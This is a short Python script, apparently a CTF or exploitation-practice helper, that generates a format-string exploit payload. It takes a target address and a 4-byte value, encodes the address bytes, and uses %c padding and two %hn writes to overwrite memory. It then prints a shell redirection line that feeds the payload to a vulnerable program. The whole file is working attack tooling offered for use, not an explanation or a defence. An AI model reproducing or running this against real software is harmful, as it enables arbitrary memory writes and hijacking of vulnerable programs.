from sys import argv
import re

def to_esc(s: str):
	to_find = s[2::]
	if len(to_find) == 7:
		to_find = "0" + to_find
	split = re.findall('.{1,2}', to_find)
	res = ""
	for x in split[::-1]:
		res += f"\\x{x}"
	
	return "\"" + res + "\""


if len(argv) != 3:
	print("not enough arguments")
	exit(1)

dest = argv[1]
data = argv[2]

if dest.startswith("0x"):
	dest = dest[2::]

if data.startswith("0x"):
	data = data[2::]

dest_a = hex(int(dest, 16))
dest_b = hex(int(dest, 16) + 2)

data_a = int(data[0:4:], 16)
data_b = int(data[4:8:], 16)

first = (data_a, dest_b)
last = (data_b, dest_a)

if data_a > data_b:
	first = (data_b, dest_a)
	last = (data_a, dest_b)

stack_offset = 8

res = to_esc(first[1]) + " + \"aaaa\" + " + to_esc(last[1]) + " + " + "\"" + "%c" * stack_offset + "\""

# written already
base_size = 12 + stack_offset

res += f" + \"%{first[0] - base_size}c\" + \"%hn\" + \"%{last[0] - first[0]}c\" + \"%hn\""

print(f'< <(python -c \'print({res})\')')